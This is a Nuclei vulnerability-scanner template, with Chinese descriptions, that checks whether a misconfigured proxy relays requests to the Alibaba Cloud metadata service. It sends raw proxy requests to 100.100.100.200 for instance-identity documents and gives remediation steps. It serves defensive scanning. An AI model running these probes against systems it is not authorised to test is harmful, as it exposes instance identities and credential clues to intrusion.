id: metadata-service-alibaba

# This attack abuses a misconfigured proxy that allows access to the metadata
# IP or a name which resolves to the IP. A standard proxy request is made to
# the proxy using the full metadata URL, which the proxy will fulfill to its
# own metadata service.
#
# The proxy may also be vulnerable to host/port enumeration on localhost or
# inside the private network.
info:
  name: Alibaba 元数据 服务 Check
  author: sullo,pwnhxl
  severity: critical
  description: |
    检测到 Alibaba 元数据 服务 Check。目标可能暴露云实例、容器或运行环境元数据，攻击者可据此获取实例身份、网络配置、凭据线索或部署信息。
  remediation: |
    - 限制该端点的公网访问，仅允许可信来源访问。
    - 启用认证、授权和审计，并根据业务需要关闭不必要的调试或管理功能。
  reference:
    - https://www.alibabacloud.com/help/doc-detail/108460.htm
    - https://blog.projectdiscovery.io/abusing-reverse-proxies-metadata/
    - https://www.mcafee.com/blogs/enterprise/cloud-security/how-an-attacker-could-use-instance-metadata-to-breach-your-app-in-aws/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N
    cvss-score: 9.3
    cwe-id: CWE-441
  metadata:
    max-request: 4
  tags: exposure,config,alibaba,proxy,misconfig,metadata,vuln

http:
  - raw:
      - |+
        GET http://{{hostval}}/{{path}} HTTP/1.1
        Host: {{hostval}}

    payloads:
      hostval:
        - alibaba.oast.pro
        - 100.100.100.200
      path:
        - latest/dynamic/instance-identity/document
        - 2016-01-01/dynamic/instance-identity/document
    attack: clusterbomb

    unsafe: true
    matchers:
      - type: word
        part: body
        words:
          - '"serial-number"'
          - '"zone-id":"'
        condition: and
# digest: 4b0a00483046022100f6184adaee9902df1db62cc17e9dab23188d8343aca3417a81f0b97f7d0d734f022100cd0831decfe511d8c6eb357929cbadd2356df54bc6b6afbea155ea1e5c39d903:922c64590222798bb761d5b6d8e72950